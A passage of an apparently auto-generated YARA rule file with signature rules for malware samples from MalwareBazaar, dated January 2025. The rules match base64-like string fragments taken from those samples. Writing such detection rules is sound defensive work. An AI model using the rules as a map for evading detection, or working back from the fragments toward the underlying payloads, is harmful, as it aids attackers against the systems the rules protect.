      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s5 = "AAAAAAAAAADAA" ascii /* base64 encoded string '       0 ' */
      $s6 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s7 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                   ' */
      $s9 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s10 = "ADAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' 0              ' */
      $s11 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s12 = "DAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s13 = "TRjNlNXYC12byZEA0JXZ252bDBgb39GZ0VHaTBgb39GZ0VHaTRXZrN2bTBAdyFGdzVmUAMXby9mRuM3dvRmbpdlLtVGdzl3UAQ2boRXZNVmchBXbvNEAzdmbpJHdTBAc" ascii
      $s14 = "F8qcoMjFKAAALhiFwBQBvK3ERAAACILOGAAAmgCcAUQpy9wMWoAAAsEKWAHAFUqcTEBAAIQ04Ag3KAAAlgiBAAgJooAAAICKKAAAQiiCAAAlvhQEKAAAQiCBAAAH+pAA" ascii
      $s15 = "f1URUNVWT91UFBARFJVSVFVRS9VWBxEUTlERfNVRAMVVPVlTJRlTPN0XTVEAf9VZ1xWY2BQb15WRAUWbpR1dkBQZ6l2UiNGAlBXeUVWdsFmVAU2avZnbJBAdsV3clJ1Y" ascii
      $s16 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s17 = "v5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT" ascii
      $s18 = "BYjARQw1MEVAZAQxPofAJRAyPsnABQQwBYjABQwuPwUA5TQrPQRAxHQ9O4fApTwmC0UAZTQlOceAhLgnBYTARTQhMEVAZAQcC0UAJHwBOMaAJBQcOMZABTwfOUYAJRQe" ascii
      $s19 = "r92bIN3dvRmbpd1av9GauVFAklEZhVmcoR1dkBAZv1EaA4mZwxGAr92bIRWaAgXRr92bIN3dvRmbpdFdlNFAEl0av9GafBwYvJHcfBgTX9ERZV0Sf10VAUGb0lGV39GZ" ascii
      $s20 = "4AAAAAAAAAEBA" ascii /* base64 encoded string '       @@' */
   condition:
      uint16(0) == 0x4141 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca {
   meta:
      description = "evidences - file 4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s5 = "AAAAAAAAAADAA" ascii /* base64 encoded string '       0 ' */
      $s6 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s7 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                   ' */
      $s9 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s10 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s11 = "DAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s12 = "AEBAAAAAAAAAAAA" ascii /* base64 encoded string ' @@        ' */
      $s13 = "TRjNlNXYC12byZEA0JXZ252bDBgb39GZ0VHaTBgb39GZ0VHaTRXZrN2bTBAdyFGdzVmUAMXby9mRuM3dvRmbpdlLtVGdzl3UAQ2boRXZNVmchBXbvNEAzdmbpJHdTBAc" ascii
      $s14 = "uMHbvN2b09mcQ5yclNWa2JXZT5iYldlLtVGdzl3U0AQAh5gDO4QAEAyBA4RAHQAAeEgCEAgHAEAEF4QAHMQFSEwBEEXEVIRAAYACBcwACEwBDwBHBAABAAgclRXdw12b" ascii
      $s15 = "F8qcoMjFKAAALhiFwBQBvK3ERAAACILOGAAAmgCcAUQpy9wMWoAAAsEKWAHAFUqcTEBAAIQ04Ag3KAAAlgiBAAgJooAAAICKKAAAQiiCAAAlvhQEKAAAQiCBAAAH+pAA" ascii
      $s16 = "f1URUNVWT91UFBARFJVSVFVRS9VWBxEUTlERfNVRAMVVPVlTJRlTPN0XTVEAf9VZ1xWY2BQb15WRAUWbpR1dkBQZ6l2UiNGAlBXeUVWdsFmVAU2avZnbJBAdsV3clJ1Y" ascii
      $s17 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s18 = "v5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT" ascii
      $s19 = "BYjARQw1MEVAZAQxPofAJRAyPsnABQQwBYjABQwuPwUA5TQrPQRAxHQ9O4fApTwmC0UAZTQlOceAhLgnBYTARTQhMEVAZAQcC0UAJHwBOMaAJBQcOMZABTwfOUYAJRQe" ascii
      $s20 = "r92bIN3dvRmbpd1av9GauVFAklEZhVmcoR1dkBAZv1EaA4mZwxGAr92bIRWaAgXRr92bIN3dvRmbpdFdlNFAEl0av9GafBwYvJHcfBgTX9ERZV0Sf10VAUGb0lGV39GZ" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678 {
   meta:
      description = "evidences - file 73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                      ' */
      $s4 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAEA" ascii /* base64 encoded string '                   @' */
      $s6 = "BAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s7 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s8 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */
      $s9 = "VYAAAAwXfV2YuFGdz5WSf9VZz9GczlGRT81XlNmbhR3cul0XfVGdhVmcDJBbvN2b09mcQRnbllGbDBHd0hEch92UuMHbvN2b09mcQ5yclNWa2JXZT5iYldlLtVGdzl3U" ascii
      $s10 = "BEerTgDBjGQGEkgAlEQGEEwBLOg7AEzBFWh0Dk/B/VRyDk/BopAhDkerTgDBhVhsDkOB/lwVDk3BbVhiDk3BCtgODEgAlUBfDk9B7UBbDktAlEQGDktBNWBUBkWALUhQ" ascii
      $s11 = "UV1QFhVRA8kROlEVVBlTJR1UBxEAyVGcsVGSAMVRB1Ga0lmcvdGbBBgclxGbhR3culmbVBwcldWYzNXZNBAdlt2YvNFduVWasNEAiVHdTBgbpFWTAM3ZulGd0V2UAEDY" ascii
      $s12 = "0AAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s13 = "AAQRQBAAAAAAAAAJK0QDuUGZv1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s14 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s15 = "DdBFRIKcAYQZyZBFRQxEBAAAt04GKAAAkerTgDmCAAwoo8QEQEhCAAgovhxFRoAAAEKKKAAAderTgDmDRoAAAw5bOEhFWchEYEhCAAQooAAAAwJIAAQAAAiFWghEOERD" ascii
      $s16 = "uV2RyVGbpBXbvNEAlRXdilmc0RXQjlGdhR3UkFWZyhGVAUGd1JWayRHdBVGbil2cpZVbvNEAzV2YpZnclNFcvJXZ05WSuUWbpRnb1JlLtVGdzl3UAUGd1JWayRHdB52b" ascii
      $s17 = "OAAADwBAAMgDcEAAEwhBCUiEGMQISYwAdIhBDUQHGMgCGIQGSYwACYgAIYgAOYgAAMBAoQAATYwAAMBAgQAATIAAeARABEAMHAgHA4RABAxBA4hAOAAIDUhEAACBIAAI" ascii
      $s18 = "AoAAAAAAAAAAAAAAAoAAAAAAAoAABAAAAAAAAAAAAAAAEAAAaYHAAAAAAAAAAAAAAAAABAAAASAADYQoAEZAABgAGMIAPGAAAIgBVBQjBAAACUA2AcYAAAABF4GABGAQ" ascii
      $s19 = "DBAZuV2Uul2ZlJEAsx2bQBQZk9WT0NWZsV2UAIXZ05WRAI3b0lmbv1EAlBXeUVWdsFmVu90aj9GTj5WeTJ3bGt2Ylh2QAw2byRnbvN0dvxmR0NWZqJ2TAwGbhNUZ0FGT" ascii
      $s20 = "S5WS0xWa1J0c39GZul2VAwWYwl2YulmcQN3dvRmbpdFA05WZyJXdDRXZHBQe0lGduVGZJN3dvRmbpdFAsFGcpNmbpJHUukHdpJXdjV2Uu0WZ0NXeTBwZulmc0NVZyFGc" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 100KB and
      8 of them
}

rule f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0 {
   meta:
      description = "evidences - file f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                  ' */
      $s7 = "ZxC6Wt7JzJBvF8jF8ZlMdhAJkI0J2Jx89qWerTgDE7UMg5Sl5Msl0F482/McbOgJ3wq9Y2PKEYe0GvvbKutccHETyMYzxYBU2QIHXOg0Sk1BdDaUmH7iINp4ogWQi0W9" ascii
      $s8 = "ErTz23eWg6T8erTgDZ650B1ipzyhq9iaYerTgDoGnerTgDK3zVDh/n6dGMY7x5TmpPsHaABl/3MuV1ni8vYBGcoOgQ9j8YU0v1Tx16erTgD/sPyR4RRACYq62eUHLerT" ascii
      $s9 = "pvh1ZNbina3yhM00jBKp7erTgDdnpDparXuyR7dwLpTd59yey4FgqM4EKAv2merTgDTefqKUwGLerTgDhBG4iRCQe4u/Wu30NpKdLpTapZ5OTKzTDrNvLHx1Er1B4Tbm" ascii
      $s10 = "tjNBLImzg0dYQglcSOFxt8dtEmpU/HFueT3PRE7OzyoWD9tZTSzlrD3em8fXRjlhve3AeWa8AjsSnH42SxjZgUGH3BeAPf3tALkK731Bgfyj2GOJwanML7h7erTgDzTu" ascii
      $s11 = "AAAAAAAAAABAAAAAAAAA" ascii /* base64 encoded string '        @      ' */
      $s12 = "BAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s13 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */
      $s14 = "ADAAAAAAADEA" ascii /* base64 encoded string ' 0     1 ' */
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ' */
      $s16 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                   ' */
      $s18 = "AEAAAAAAAAA" ascii /* base64 encoded string ' @      ' */
      $s19 = "AAAAAAAAAAAAAAAC" ascii /* base64 encoded string '           ' */
      $s20 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                  ' */
   condition:
      uint16(0) == 0x3d3d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_3e9a9cd60c979d5f31f87fd3507a95184b8c8f214e012399211d3578c4cc4181 {
   meta:
      description = "evidences - file 3e9a9cd60c979d5f31f87fd3507a95184b8c8f214e012399211d3578c4cc4181.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "3e9a9cd60c979d5f31f87fd3507a95184b8c8f214e012399211d3578c4cc4181"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                               ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                   ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                       ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                       ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                            ' */
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                           ' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                         ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                     ' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                               ' */
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                      ' */
      $s16 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                    ' */
      $s18 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */
      $s19 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                 ' */
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                        ' */
   condition:
      uint16(0) == 0x3d3d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_70698e62c2170d003b444ecf0c5f6af81f98e26a56198e118930566be818fe52 {
   meta:
      description = "evidences - file 70698e62c2170d003b444ecf0c5f6af81f98e26a56198e118930566be818fe52.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "70698e62c2170d003b444ecf0c5f6af81f98e26a56198e118930566be818fe52"
   strings:
      $s1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ' */
      $s4 = "CvbRO8vxTWkzO78zysYC//P9xjum0vushXw6aBAAA4MaALlXH18pQse81vezjXw6AAAAanr9zzULe6w6WU/656VBrDAAcMHu7aNy8NLDPs+VWNFBsPY5JWFAIIcyb51X" ascii
      $s5 = "GbJ/zad1cNv31RkZR9TyzsQ0EeFhPcBn5eAhdYLhMZKBb2P0cQzHb2wMaGBDTBkoeTJYoYtid4ubAWhN/hAr0gU/dHFiPI07D+KWAFwDXok8e8tWePMSAFRD7elCuxR4" ascii
      $s6 = "ciq9uBx6GW/68OcBrDAAp8Auxn5kWakQPs+VWNFDsPY5JWFAIIcyb51X8X0iyLf5iWeu6b+9Ygg5XBwZxULFxag5Zlv5RxMCmTVDNwQrlFH8bjAMZ2h5nlv5sXHCmXVD" ascii
      $s7 = "TkLFMnEHKHUQBBUvEY4//DP0oH39rXoUFsuWBp2A9qhCrba9rTfwFsOAAIwO5GSdHQAiB/w6CT/6T5fBrjFAAAClop1an14lPs+VWNFDsPY5JWFAEIcyb5F/Fto5mj+B" ascii
      $s8 = "KxVufSLRGxuTWNFfK1YlKywbvtIRcKVbsCgU0j5aVAPpNkjnFRTQslVjD1GB7lS1IgHF4ILNSbZRUlEs0GXO0JFEtS2UAKEvbxYn4OACWROSUAFRLRLTkdFlIRoWlxX3" ascii
      $s9 = "1FZaFWIE6BRhFG43SmiKG+Qhu9Qh35gu/XYhAmrkpY3DFq2DFqih/cvZpUoe6lm8SI3Jx///4bH6Kf/6DzfBrrleq1ugETPAj3w6LL/6cLaBrTAxDSCDLmmaPpHuPs+8" ascii
      $s10 = "d5zSklc6VF8Roph3BY9VEy6GeTvnlQ+OAvmoBo37kBLoSDt0aU4vdzmpeDyteP+hQZh1MmzZR5/z1lSTBTHlfvRN1wnhlvlyzv2rNIhocJ4zdOxbPwI7IFclAQgV8Gqz" ascii
      $s11 = "PRKLARSelogHEeXEP1oq3sxlCIxq3ah4U9473JdMuym1/cGW3KNtvn0f4hIjn6iNPQKCL8RFntRfWvbdApxqcSNyriC9V+SlzYqLMFlPkhYSt1yFoUdVs9np2TVNWDVH" ascii
      $s12 = "n0vpmaqpO9//lnO60U/6VUaBrDAAAYqu17M5wPdQPs+81veDSUw6AAAA/lbh2LsaNs+7vv+zWWw6EQ8gkQwiAAwK7hGhAdVMTsOGsPY5JWFAIIcye9F/FtYkRiYVGSMn" ascii
      $s13 = "cUWHUXCrobt6n9DNJjGGx2xmh0276UXvMDm1PiFexyMSTLVncB0GPoBZdV4yNmoZDBRoz0nPO4AtR0mPEgcn1aYZYZWh0Sd+cFHW+YBniHzRun2DNU1BRcERN8AXsYN1" ascii
      $s14 = "otgVHzggNLwXKn8LgHUFv/tM0iscuuZoZTDVMyi3FHThsGAjvJaRuNg6JrXLJsYXkrAyM+81+7ktB6R/SweyndOggDulXCj1n1b7PCQBp/rb2oeMM4SOlzCQFrTWe/dB" ascii
      $s15 = "+xXa+N3ZRcnYp53cnFBZ2lmfzdWEyxHd8x3ZRUnZwNGfnFRY8VnI8dWEiRmf8x3ZRw3ciRGfnFhY/gnc8dWEREBR5/v+7WR1SGRERUrguHEHlFdl9ak5Y2BZaGNIZwkm" ascii
      $s16 = "AAAAAIJAIFQALEwDAAOAAAAAAAAAAYGT3eJABEATAAQRQBAAAAAAAAAAkoQDuUGZv1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4gu" ascii
      $s17 = "maGFOfwkhFWZ4lNkoXJHqfXFOfwkhFWZDlNkofJYIURokXjMeejNVyh6VSC6ZJjnhsQMjFIonieYhFm4l7WokXjMeGTMpxj6dSC6hC1//L/joL/9rP3PFsuWhp2YH9xV" ascii
      $s18 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                ' */
      $s19 = "fxokeTEThOnctQNiTXpYdM/db3qVWERfu4Ez3J9Yi0SysInHMRjoHtx0d4mCEQ/u7eq107PD3SNt/e/zINM2Ns13K7GMk0vxoZQ4FzwA15ycFEUxj685uYXZx8DdAlzB" ascii
      $s20 = "M8yD+x2LCy2Uu+QgsJ62goedGM8oNzyDCyWRlBuhsVkhDPaziMggstipBUIbHZ7wj2MEDIIbFZ4wj2cCLIIbCWmRLwYhsRFcspPPCyW3VUNAOkNyTIhisFKasZynCy2g" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 100KB and
      8 of them
}

